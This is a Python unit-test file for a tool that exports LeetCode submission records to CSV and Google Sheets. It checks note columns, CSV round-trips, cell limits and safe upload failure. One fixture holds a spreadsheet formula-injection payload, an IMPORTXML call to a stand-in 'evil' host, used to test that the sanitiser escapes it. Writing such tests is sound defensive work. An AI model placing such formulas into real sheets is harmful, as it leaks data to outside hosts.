"""Tests for sheet rows: notes fidelity and formula-injection safety."""
import csv
import io
import sys
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))

import google_sheets
import tracker
from comment_parser import NOTE_FIELDS


def make_tracker(tmp: Path):
    data = {"schema_version": 1, "problems": {}}
    tracker.import_submission(tmp, data, {
        "submission_id": "1001", "frontend_id": "1", "slug": "two-sum",
        "title": "Two Sum", "difficulty": "Easy", "tags": ["Array", "Hash Table"],
        "submitted_at": "2025-05-01T10:00:00+00:00", "language": "python3",
        "status": "Accepted", "code": "# a\n# b\nclass Solution: pass\n",
        "runtime": "50 ms", "memory": "17 MB",
        "leetcode_notes": "=IMPORTXML(\"https://evil\",\"//x\")",
        "raw_comments": ["first comment", "second comment"],
        "notes": {"thought_process": "hash map", "time_complexity": "O(n)"},
    })
    tracker.import_submission(tmp, data, {
        "submission_id": "1000", "frontend_id": "1", "slug": "two-sum",
        "title": "Two Sum", "difficulty": "Easy", "tags": ["Array", "Hash Table"],
        "submitted_at": "2025-04-30T10:00:00+00:00", "language": "python3",
        "status": "Wrong Answer", "code": "class Solution: fail\n",
    })
    return data


class TestRows(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        self.addCleanup(self._tmp.cleanup)
        self.rows = google_sheets.build_rows(make_tracker(self.root))
        self.header = self.rows[0]

    def cell(self, row, name):
        return row[self.header.index(name)]

    def test_one_row_per_accepted_attempt_only(self):
        self.assertEqual(len(self.rows), 2)
        self.assertEqual(self.cell(self.rows[1], "submission_id"), "1001")

    def test_header_contains_all_note_fields(self):
        for field in NOTE_FIELDS:
            self.assertIn(field, self.header)

    def test_formula_injection_is_neutralized(self):
        self.assertEqual(self.cell(self.rows[1], "leetcode_notes"),
                         "'=IMPORTXML(\"https://evil\",\"//x\")")

    def test_sanitize_covers_all_dangerous_prefixes(self):
        for prefix in "=+-@":
            self.assertEqual(google_sheets.sanitize_cell(f"{prefix}x"), f"'{prefix}x")
        self.assertEqual(google_sheets.sanitize_cell("safe"), "safe")
        self.assertEqual(google_sheets.sanitize_cell(None), "")
        self.assertEqual(google_sheets.sanitize_cell(3), "3")

    def test_raw_comments_joined_with_newlines(self):
        self.assertEqual(self.cell(self.rows[1], "raw_comments"),
                         "first comment\nsecond comment")

    def test_structured_notes_in_separate_columns(self):
        self.assertEqual(self.cell(self.rows[1], "thought_process"), "hash map")
        self.assertEqual(self.cell(self.rows[1], "time_complexity"), "O(n)")
        self.assertEqual(self.cell(self.rows[1], "core_insight"), "")

    def test_review_columns_default_to_new(self):
        self.assertEqual(self.cell(self.rows[1], "review_state"), "new")
        self.assertEqual(self.cell(self.rows[1], "reps"), "0")

    def test_csv_round_trip_preserves_multiline_cells(self):
        path = self.root / "google-sheets.csv"
        google_sheets.write_csv(path, self.rows)
        with path.open(newline="", encoding="utf-8") as handle:
            parsed = list(csv.reader(handle))
        self.assertEqual(parsed, self.rows)

    def test_url_and_code_path_columns(self):
        self.assertEqual(self.cell(self.rows[1], "url"),
                         "https://leetcode.com/problems/two-sum/")
        self.assertEqual(self.cell(self.rows[1], "code_path"),
                         "solutions/1-two-sum/1001.py")

    def test_sheet_cell_limit_is_checked_before_upload(self):
        rows = [list(google_sheets.HEADER), [""] * len(google_sheets.HEADER)]
        rows[1][0] = "x" * (google_sheets.MAX_CELL_CHARACTERS + 1)
        with self.assertRaises(ValueError):
            google_sheets.validate_sheet_rows(rows)

    def test_failed_update_does_not_clear_existing_rows(self):
        class Worksheet:
            row_count = 3
            col_count = len(google_sheets.HEADER)
            batch_cleared = False
            def update(self, **kwargs):
                raise RuntimeError("network failed")
            def batch_clear(self, ranges):
                self.batch_cleared = True
        worksheet = Worksheet()
        spreadsheet = SimpleNamespace(worksheet=lambda name: worksheet)
        module = SimpleNamespace(
            oauth=lambda **kwargs: SimpleNamespace(open_by_key=lambda key: spreadsheet),
            exceptions=SimpleNamespace(WorksheetNotFound=type("WorksheetNotFound", (Exception,), {})),
        )
        credentials = self.root / "client.json"
        credentials.write_text("{}")
        config = SimpleNamespace(
            spreadsheet_id="sheet", google_credentials_file=credentials,
            google_token_file=self.root / "token.json", worksheet="LeetCode",
        )
        with patch.dict(sys.modules, {"gspread": module}), self.assertRaises(RuntimeError):
            google_sheets.push_rows(config, [list(google_sheets.HEADER)])
        self.assertFalse(worksheet.batch_cleared)


if __name__ == "__main__":
    unittest.main()
